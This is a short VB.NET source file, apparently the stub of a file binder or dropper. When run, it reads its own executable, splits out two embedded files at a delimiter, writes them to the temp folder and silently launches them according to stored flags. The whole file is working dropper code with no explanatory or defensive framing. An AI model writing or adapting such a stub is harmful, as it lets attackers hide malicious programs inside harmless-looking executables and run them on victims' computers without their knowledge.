Imports System.IO
Public Class hodown

    Dim joejacksmomma(), ask As String
    Const FileSplit = "@onetwothree@"

    Private Sub start(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Dim assmaster As String = System.IO.Path.GetTempPath
        FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared)
        ask = Space(LOF(1))
        FileGet(1, ask)
        FileClose(1)
        joejacksmomma = Split(ask, FileSplit)
        FileOpen(3, assmaster & joejacksmomma(3), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(3, joejacksmomma(1))
        FileClose(3)
        FileOpen(5, assmaster & joejacksmomma(4), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
        FilePut(5, joejacksmomma(2))
        FileClose(5)
        If joejacksmomma(5) = True Then
            System.Diagnostics.Process.Start(assmaster & joejacksmomma(3))
        End If
        If joejacksmomma(6) = True Then
            System.Diagnostics.Process.Start(assmaster & joejacksmomma(4))
        End If
        Me.Close()
        End
    End Sub
End Class
